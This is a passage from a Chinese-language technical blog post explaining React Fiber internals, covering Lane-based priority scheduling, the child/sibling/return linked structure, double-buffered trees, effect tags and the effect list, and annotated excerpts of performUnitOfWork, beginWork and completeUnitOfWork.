I[继续处理]</pre><p>时间切片和增量渲染协同工作流程如下：</p><ol><li>增量渲染拆解任务：将整个渲染任务拆分为 Fiber 节点任务队列</li><li>时间切片分配时间：将浏览器每个渲染帧的空闲时间分配给任务队列</li><li>优先级调度介入：允许高优先级任务抢占当前执行</li><li>渐进式提交：完成的部分内容可先提交显示</li></ol><h3 id="基于优先级的任务调度"><a href="#基于优先级的任务调度" class="headerlink" title="基于优先级的任务调度"></a>基于优先级的任务调度</h3><p>React 使用 Lane 模型定义优先级，每个优先级对应一个二进制位</p><p><strong>调度流程</strong></p><p>任务标记阶段：当触发更新时，React 根据场景分配优先级</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">requestUpdateLane</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (isTransition) <span class="hljs-keyword">return</span> <span class="hljs-title class_">TransitionLane</span>;       <span class="hljs-comment">// useTransition 更新</span><br>  <span class="hljs-keyword">if</span> (isUserBlockingEvent) <span class="hljs-keyword">return</span> <span class="hljs-title class_">InputLane</span>;    <span class="hljs-comment">// 用户交互事件</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">DefaultLane</span>;                          <span class="hljs-comment">// 默认更新</span><br>&#125;<br><br><span class="hljs-comment">// 示例：点击事件触发的更新</span><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> updateLane = <span class="hljs-title function_">getEventPriority</span>(event);   <span class="hljs-comment">// 返回 InputContinuousLane</span><br>  <span class="hljs-title function_">scheduleUpdate</span>(fiber, updateLane);<br>&#125;);<br></code></pre></td></tr></table></figure><p>任务调度阶段：根据优先级和剩余时间控制执行顺序</p><pre class="mermaid">sequenceDiagram    participant Browser as 浏览器    participant Scheduler as React调度器    participant Renderer as 渲染器        Browser->>Scheduler: 新帧开始（16.6ms）    Scheduler->>Renderer: 获取待处理任务    Renderer->>Renderer: 按优先级排序任务    loop 时间切片执行        Renderer->>Renderer: 执行最高优先级任务        Renderer-->>Scheduler: 检查剩余时间        Scheduler->>Browser: 时间用尽则归还控制    end    Browser->>Browser: 执行绘制/用户输入    Browser->>Scheduler: 下一帧继续</pre><p>中断与抢占机制：</p><ul><li>高优先级任务可直接中断正在执行的低优先级任务</li><li>被中断的任务可保存进度到 nextUnitOfWork 指针中，后续恢复</li></ul><p>饥饿问题处理：长时间未执行的低优先级任务会被逐步提升优先级</p><p><strong>关键调度策略</strong></p><ol><li>批量更新合并：比如相同优先级的多个 setState 会被合并</li><li>优先级反转预防：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ensureRootIsScheduled</span>(<span class="hljs-params">root</span>) &#123;<br>  <span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">getNextLanes</span>(root, root.<span class="hljs-property">pendingLanes</span>);<br>  <span class="hljs-keyword">const</span> highestPriorityLane = <span class="hljs-title function_">getHighestPriorityLane</span>(nextLanes);<br>  <br>  <span class="hljs-comment">// 当前执行中的低优先级任务被高优先级打断</span><br>  <span class="hljs-keyword">if</span> (existingCallbackPriority !== highestPriorityLane) &#123;<br>    <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode); <span class="hljs-comment">// 取消旧任务</span><br>    <span class="hljs-title function_">scheduleNewCallback</span>(highestPriorityLane); <span class="hljs-comment">// 调度新任务</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>时间切片分配：不同优先级的任务获得的时间片不同</li></ol><table><thead><tr><th align="left">优先级</th><th align="left">单次分配时间</th><th align="left">是否可中断</th></tr></thead><tbody><tr><td align="left">SyncLane</td><td align="left">不限</td><td align="left">否</td></tr><tr><td align="left">InputContinuousLane</td><td align="left">5ms</td><td align="left">是（仅限更高优先级）</td></tr><tr><td align="left">DefaultLane</td><td align="left">2ms</td><td align="left">是</td></tr><tr><td align="left">TransitionLane</td><td align="left">1ms</td><td align="left">是</td></tr></tbody></table><h1 id="第三章：Fiber的数据结构与算法实现"><a href="#第三章：Fiber的数据结构与算法实现" class="headerlink" title="第三章：Fiber的数据结构与算法实现"></a>第三章：Fiber的数据结构与算法实现</h1><h2 id="3-1-Fiber节点的详细结构解析"><a href="#3-1-Fiber节点的详细结构解析" class="headerlink" title="3.1 Fiber节点的详细结构解析"></a>3.1 Fiber节点的详细结构解析</h2><h3 id="child、sibling、return指针的链表关系"><a href="#child、sibling、return指针的链表关系" class="headerlink" title="child、sibling、return指针的链表关系"></a>child、sibling、return指针的链表关系</h3><p>Fiber 架构的设计哲学在于将树形结构转化为单向链表+树形回溯的混合结构，在保持父子关系的同时获得链表的高效遍历能力。实现该混合结构的关键点就是 child、sibling、return 这三个指针。</p><p><strong>三个指针的作用与关系</strong></p><table><thead><tr><th align="left">指针名</th><th align="left">指向</th><th align="left">功能描述</th><th align="left">类比传统树结构</th></tr></thead><tbody><tr><td align="left">child</td><td align="left">第一个子节点</td><td align="left">向下遍历的入口</td><td align="left">node.firstChild</td></tr><tr><td align="left">sibling</td><td align="left">下一个兄弟节点</td><td align="left">横向遍历同级节点</td><td align="left">node.nextSibling</td></tr><tr><td align="left">return</td><td align="left">父节点</td><td align="left">完成当前分支后向上回溯</td><td align="left">node.parentNode</td></tr></tbody></table><p><strong>链表结构图解</strong></p><p>假设有如下组件树：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;App&gt;<br>  &lt;Header /&gt;<br>  &lt;Content&gt;<br>    &lt;Sidebar /&gt;<br>    &lt;Main /&gt;<br>  &lt;/Content&gt;<br>&lt;/App&gt;<br></code></pre></td></tr></table></figure><p>那该组件树对应的 Fiber 链表结构如下：</p><pre class="mermaid">graph TD    A[App] -->|child| B[Header]    B -->|sibling| C[Content]    C -->|child| D[Sidebar]    D -->|sibling| E[Main]    E -->|return| C    D -->|return| C    C -->|return| A    B -->|return| A</pre><p>指针关系表如下：</p><table><thead><tr><th align="left">Fiber 节点</th><th align="left">child</th><th align="left">sibling</th><th align="left">return</th></tr></thead><tbody><tr><td align="left">App</td><td align="left">Header</td><td align="left">null</td><td align="left">null</td></tr><tr><td align="left">Header</td><td align="left">null</td><td align="left">Content</td><td align="left">App</td></tr><tr><td align="left">Content</td><td align="left">Sidebar</td><td align="left">null</td><td align="left">App</td></tr><tr><td align="left">Sidebar</td><td align="left">null</td><td align="left">Main</td><td align="left">Content</td></tr><tr><td align="left">Main</td><td align="left">null</td><td align="left">null</td><td align="left">Content</td></tr></tbody></table><h3 id="alternate与双缓存树（Current-WorkInProgress）"><a href="#alternate与双缓存树（Current-WorkInProgress）" class="headerlink" title="alternate与双缓存树（Current&#x2F;WorkInProgress）"></a>alternate与双缓存树（Current&#x2F;WorkInProgress）</h3><p>alternate 指针和双缓存树是实现并发渲染和状态一致性的核心机制</p><p><strong>双缓存树的本质</strong></p><p>基本概念</p><table><thead><tr><th align="left">树类型</th><th align="left">作用</th><th align="left">特点</th></tr></thead><tbody><tr><td align="left">current</td><td align="left">当前界面正在显示内容对应的 Fiber 树</td><td align="left">用户正在交互的稳定版本</td></tr><tr><td align="left">workInProgress</td><td align="left">正在内存中构建的 Fiber 树（即将成为下一针显示内容）</td><td align="left">可中断、可丢弃的中间状态</td></tr></tbody></table><p>alternate 指针的作用：每个 Fiber 节点都有一个 alternate 字段，指向另一棵树上的对应节点（current fiberNodeA.alternate &lt;-&gt; workInProgress fiberNodeA.alternate）</p><p><strong>双缓存树的工作流程</strong></p><p>初始渲染阶段：</p><pre class="mermaid">sequenceDiagram    participant R as React    participant D as DOM        R->>R: 创建 WorkInProgress 树（初始为空）    R->>R: 从 Root 开始构建 Fiber 节点    R->>R: 每个新节点设置 alternate=null    R->>D: 首次渲染完成后, WorkInProgress 树变为 Current 树</pre><p>更新阶段：</p><pre class="mermaid">sequenceDiagram    participant C as Current 树    participant W as WorkInProgress 树    participant R as React 调度器        R->>W: 从 Current 树的 Root 克隆节点    C->>W: 通过 alternate 互相指向    loop 渲染阶段        R->>W: 增量构建/更新节点        W->>C: 通过 alternate 对比差异    end    R->>C: 提交完成后交换两棵树</pre><h3 id="effectTag与副作用链表（Effect-List）"><a href="#effectTag与副作用链表（Effect-List）" class="headerlink" title="effectTag与副作用链表（Effect List）"></a>effectTag与副作用链表（Effect List）</h3><p>在了解 effectTag 之前，我们先了解下什么是 side effects（副作用）。</p><p>在 React 中，副作用是指那些在组件渲染过程中与外部世界交互或影响外部状态的操作（不能在 render 阶段完成）。它们超出了纯函数式渲染的范畴，是 React 组件中需要特殊处理的行为。</p><p><strong>副作用的本质特征</strong></p><table><thead><tr><th align="left">特征</th><th align="left">说明</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">非纯操作</td><td align="left">违反纯函数原则（相同输入 ≠ 相同输出）</td><td align="left">数据获取、DOM 手动操作</td></tr><tr><td align="left">外部依赖</td><td align="left">与 React 渲染流程外的系统交互</td><td align="left">访问浏览器 API、网络请求</td></tr><tr><td align="left">时序敏感性</td><td align="left">执行时机影响结果</td><td align="left">事件监听、定时器</td></tr><tr><td align="left">资源管理</td><td align="left">需要显式清理</td><td align="left">取消订阅、移除事件监听</td></tr></tbody></table><p><strong>副作用分类机制</strong></p><table><thead><tr><th align="left">副作用类型</th><th align="left">处理方式</th><th align="left">对应 Hook</th></tr></thead><tbody><tr><td align="left">同步 DOM 副作用</td><td align="left">布局阶段同步执行</td><td align="left">useLayoutEffect</td></tr><tr><td align="left">异步副作用</td><td align="left">浏览器绘制后执行</td><td align="left">useEffect</td></tr><tr><td align="left">状态更新副作用</td><td align="left">随渲染流程处理</td><td align="left">useState&#x2F;useReducer setter</td></tr><tr><td align="left">回调副作用</td><td align="left">事件处理中执行</td><td align="left">事件处理函数</td></tr></tbody></table><p><strong>正确处理副作用的规则</strong></p><ol><li>副作用隔离原则：避免渲染中执行（不要在 render 函数中或函数式组件主题中直接操作副作用），使用 Hook 封装（比如 useEffect）</li><li>明确声明依赖项（useEffect dependencies）</li><li>副作用清理机制（useEffect return）</li></ol><p>effectTag则是<code>副作用标记系统</code>。</p><p><strong>effectTag 的本质与作用</strong></p><ul><li>二进制位掩码：每个 effectTag 是一个二进制数，表示需要执行的副作用类型</li><li>高效内存管理：通过位运算组合多个标记（如 Placement | Update）</li><li>精确追踪：标记哪些 Fiber 节点需要进行 DOM 操作或其他副作用</li></ul><p><strong>常见的 effectTag 值</strong></p><table><thead><tr><th align="left">标记</th><th align="left">值（二进制）</th><th align="left">对应操作</th></tr></thead><tbody><tr><td align="left">NoEffect</td><td align="left">0b00000000</td><td align="left">无副作用</td></tr><tr><td align="left">Placement</td><td align="left">0b00000010</td><td align="left">插入新节点</td></tr><tr><td align="left">Update</td><td align="left">0b00000100</td><td align="left">更新属性&#x2F;样式</td></tr><tr><td align="left">Deletion</td><td align="left">0b00001000</td><td align="left">删除节点</td></tr><tr><td align="left">Snapshot</td><td align="left">0b00010000</td><td align="left">生命周期 getSnapshotBeforeUpdate</td></tr><tr><td align="left">Passive</td><td align="left">0b00100000</td><td align="left">useEffect 的副作用</td></tr><tr><td align="left">Callback</td><td align="left">0b01000000</td><td align="left">setState 的回调</td></tr></tbody></table><p>副作用链表（effect list）是只包含<code>有副作用的 Fiber 节点</code>的链表结构，它的构建时机是在 <code>completeWork</code> 阶段串联有 effectTag 的节点。它的关键指针如下：</p><ul><li>firstEffect：链表头节点</li><li>nextEffect：下一个待处理节点</li><li>lastEffect：链表尾节点</li></ul><p><strong>副作用链表的构建过程</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">completeWork</span>(<span class="hljs-params">fiber</span>) &#123;<br>  <span class="hljs-comment">// 处理当前节点工作...</span><br>  <br>  <span class="hljs-comment">// 构建 Effect List</span><br>  <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">effectTag</span> &gt; <span class="hljs-title class_">NoEffect</span>) &#123;<br>    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">return</span> !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// 将当前节点添加到父节点的 Effect List</span><br>      <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">return</span>.<span class="hljs-property">firstEffect</span> === <span class="hljs-literal">null</span>) &#123;<br>        fiber.<span class="hljs-property">return</span>.<span class="hljs-property">firstEffect</span> = fiber;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        fiber.<span class="hljs-property">return</span>.<span class="hljs-property">lastEffect</span>.<span class="hljs-property">nextEffect</span> = fiber;<br>      &#125;<br>      fiber.<span class="hljs-property">return</span>.<span class="hljs-property">lastEffect</span> = fiber;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>effectTag&#x2F;副作用链表的工作原理</strong></p><ol><li>标记阶段：在 beginWork 中标记需要执行的 DOM 操作</li><li>链表构建：在 completeWork 阶段串联具有 effectTag 的节点</li><li>提交阶段：按链表顺序执行 DOM 操作</li></ol><h2 id="3-2-深度优先遍历的迭代实现"><a href="#3-2-深度优先遍历的迭代实现" class="headerlink" title="3.2 深度优先遍历的迭代实现"></a>3.2 深度优先遍历的迭代实现</h2><h3 id="递归遍历的问题与链表遍历的优势"><a href="#递归遍历的问题与链表遍历的优势" class="headerlink" title="递归遍历的问题与链表遍历的优势"></a>递归遍历的问题与链表遍历的优势</h3><p>在 React15 及之前版本的 stack reconciler 协调器采用的遍历策略是递归遍历</p><p><strong>递归遍历的问题</strong></p><ol><li>无条件全量遍历：从根节点开始递归处理每一个节点，无论节点状态是否变化</li><li>不可中断：依赖于 JavaScript 栈调用，一旦开始就必须执行到底，中途无法中断或跳过子节点</li><li>性能缺陷：阻塞主线程、无优先级调度</li></ol><p><strong>链表遍历的优势</strong></p><ol><li>可中断&#x2F;恢复：通过全局变量（nextUnitOfWork）保存进度，结合 requestIdleCallback 或 messageChannel 时间切片实现中断和恢复。</li><li>按需遍历：通过 lanes 和 childLanes 标记 Fiber 节点优先级，跳过无需更新的子树，时间复杂度从递归的 O(n) 优化到 O(m)</li><li>优先级调度：结合 Lane 模型动态调整遍历顺序，实现高优先级任务中断低优先级任务</li><li>内存安全：链表遍历在堆内存中进行，不受调用栈限制，没有递归栈帧累积，因此支持任意深度的组件树</li></ol><h3 id="performUnitOfWork源码解析（含配图）"><a href="#performUnitOfWork源码解析（含配图）" class="headerlink" title="performUnitOfWork源码解析（含配图）"></a>performUnitOfWork源码解析（含配图）</h3><p>我们首先了解下 Fiber 架构中的工作循环：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">/** <span class="hljs-doctag">@noinline</span> */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoopConcurrentByScheduler</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// Perform work until Scheduler asks us to yield</span><br>  <span class="hljs-keyword">while</span> (workInProgress !== <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-title function_">shouldYield</span>()) &#123;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-call] flow doesn&#x27;t know that shouldYield() is side-effect free</span><br>    <span class="hljs-title function_">performUnitOfWork</span>(workInProgress);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>performUnitOfWork 是 Fiber 架构中工作循环（<code>workLoop</code>）的最小执行单元，源码位置见<a href="https://github.com/facebook/react/blob/main/packages/react-reconciler/src/ReactFiberWorkLoop.js#L2779">这里</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">unitOfWork: Fiber</span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// The current, flushed, state of this fiber is the alternate. Ideally</span><br>  <span class="hljs-comment">// nothing should rely on this, but relying on it here means that we don&#x27;t</span><br>  <span class="hljs-comment">// need an additional field on the work in progress.</span><br>  <span class="hljs-keyword">const</span> current = unitOfWork.<span class="hljs-property">alternate</span>;<br><br>  <span class="hljs-keyword">let</span> next;<br>  <span class="hljs-keyword">if</span> (enableProfilerTimer &amp;&amp; (unitOfWork.<span class="hljs-property">mode</span> &amp; <span class="hljs-title class_">ProfileMode</span>) !== <span class="hljs-title class_">NoMode</span>) &#123;<br>    <span class="hljs-title function_">startProfilerTimer</span>(unitOfWork);<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      next = <span class="hljs-title function_">runWithFiberInDEV</span>(<br>        unitOfWork,<br>        beginWork,<br>        current,<br>        unitOfWork,<br>        entangledRenderLanes,<br>      );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      next = <span class="hljs-title function_">beginWork</span>(current, unitOfWork, entangledRenderLanes);<br>    &#125;<br>    <span class="hljs-title function_">stopProfilerTimerIfRunningAndRecordDuration</span>(unitOfWork);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      next = <span class="hljs-title function_">runWithFiberInDEV</span>(<br>        unitOfWork,<br>        beginWork,<br>        current,<br>        unitOfWork,<br>        entangledRenderLanes,<br>      );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      next = <span class="hljs-title function_">beginWork</span>(current, unitOfWork, entangledRenderLanes);<br>    &#125;<br>  &#125;<br><br>  unitOfWork.<span class="hljs-property">memoizedProps</span> = unitOfWork.<span class="hljs-property">pendingProps</span>;<br>  <span class="hljs-keyword">if</span> (next === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// If this doesn&#x27;t spawn new work, complete the current work.</span><br>    <span class="hljs-title function_">completeUnitOfWork</span>(unitOfWork);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    workInProgress = next;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其核心代码如下，主要流程分为两个阶段：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">unitOfWork: Fiber</span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// 1. 开始工作阶段（递）</span><br>  <span class="hljs-keyword">const</span> current = unitOfWork.<span class="hljs-property">alternate</span>;<br>  <span class="hljs-keyword">let</span> next;<br>  next = <span class="hljs-title function_">beginWork</span>(current, unitOfWork, entangledRenderLanes);<br><br>  <span class="hljs-comment">// 2. 完成工作阶段（归）</span><br>  <span class="hljs-keyword">if</span> (next === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-title function_">completeUnitOfWork</span>(unitOfWork);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    workInProgress = next;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>beginWork - 递阶段：处理组件更新（props&#x2F;state 计算、diff 等）</strong></p><p>核心代码逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">beginWork</span>(<span class="hljs-params"></span><br><span class="hljs-params">  current: Fiber | <span class="hljs-literal">null</span>,</span><br><span class="hljs-params">  workInProgress: Fiber,</span><br><span class="hljs-params">  renderLanes: Lanes</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Fiber</span> | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-comment">// 检查是否需要跳过更新（优化手段）</span><br>  <span class="hljs-keyword">if</span> (current !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">const</span> oldProps = current.<span class="hljs-property">memoizedProps</span>;<br>    <span class="hljs-keyword">const</span> newProps = workInProgress.<span class="hljs-property">pendingProps</span>;<br>    <br>    <span class="hljs-keyword">if</span> (oldProps === newProps &amp;&amp; !<span class="hljs-title function_">hasLegacyContextChanged</span>()) &#123;<br>      <span class="hljs-keyword">const</span> hasScheduledUpdateOrContext = <span class="hljs-title function_">checkScheduledUpdateOrContext</span>(<br>        current,<br>        renderLanes,<br>      );<br>      <span class="hljs-keyword">if</span> (<br>        !hasScheduledUpdateOrContext &amp;&amp;<br>        <span class="hljs-comment">// If this is the second pass of an error or suspense boundary, there</span><br>        <span class="hljs-comment">// may not be work scheduled on `current`, so we check for this flag.</span><br>        (workInProgress.<span class="hljs-property">flags</span> &amp; <span class="hljs-title class_">DidCapture</span>) === <span class="hljs-title class_">NoFlags</span><br>      ) &#123;<br>        <span class="hljs-comment">// No pending updates or context. Bail out now.</span><br>        didReceiveUpdate = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">attemptEarlyBailoutIfNoScheduledUpdate</span>(<br>          current,<br>          workInProgress,<br>          renderLanes,<br>        );<br>      &#125;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// 根据组件类型执行不同处理</span><br>  <span class="hljs-keyword">switch</span> (workInProgress.<span class="hljs-property">tag</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">FunctionComponent</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateFunctionComponent</span>(current, workInProgress, ...);<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ClassComponent</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateClassComponent</span>(current, workInProgress, ...);<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">HostComponent</span>: <span class="hljs-comment">// DOM 节点</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateHostComponent</span>(current, workInProgress, ...);<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ScopeComponent</span>: &#123;<br>      <span class="hljs-keyword">if</span> (enableScopeAPI) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateScopeComponent</span>(current, workInProgress, renderLanes);<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">// ...其他类型处理</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>核心操作：</p><ul><li>优先级过滤：通过 renderLanes 跳过低优先级任务</li><li>diff 算法：在<code>reconcileChildren</code>中生成子 Fiber</li><li>副作用标记：设置 effectTag</li></ul><p><strong>completeUnitOfWork - 归阶段：完成 DOM 准备、收集副作用</strong></p><p>核心代码逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">completeUnitOfWork</span>(<span class="hljs-params">unitOfWork: Fiber</span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// Attempt to complete the current unit of work, then move to the next</span><br>  <span class="hljs-comment">// sibling. If there are no more siblings, return to the parent fiber.</span><br>  <span class="hljs-keyword">let</span> <span class="hljs-attr">completedWork</span>: <span class="hljs-title class_">Fiber</span> = unitOfWork;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> ((completedWork.<span class="hljs-property">flags</span> &amp; <span class="hljs-title class_">Incomplete</span>) !== <span class="hljs-title class_">NoFlags</span>) &#123;<br>      <span class="hljs-comment">// This fiber did not complete, because one of its children did not</span><br>      <span class="hljs-comment">// complete. Switch to unwinding the stack instead of completing it.</span><br>      <span class="hljs-comment">//</span><br>      <span class="hljs-comment">// The reason &quot;unwind&quot; and &quot;complete&quot; is interleaved is because when</span><br>      <span class="hljs-comment">// something suspends, we continue rendering the siblings even though</span><br>      <span class="hljs-comment">// they will be replaced by a fallback.</span><br>      <span class="hljs-keyword">const</span> skipSiblings = workInProgressRootDidSkipSuspendedSiblings;<br>      <span class="hljs-title function_">unwindUnitOfWork</span>(completedWork, skipSiblings);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// The current, flushed, state of this fiber is the alternate. Ideally</span><br>    <span class="hljs-comment">// nothing should rely on this, but relying on it here means that we don&#x27;t</span><br>    <span class="hljs-comment">// need an additional field on the work in progress.</span><br>    <span class="hljs-keyword">const</span> current = completedWork.<span class="hljs-property">alternate</span>;<br>    <span class="hljs-keyword">const</span> returnFiber = completedWork.<span class="hljs-property">return</span>;<br><br>    <span class="hljs-keyword">let</span> next;<br>    <span class="hljs-title function_">startProfilerTimer</span>(completedWork);<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      next = <span class="hljs-title 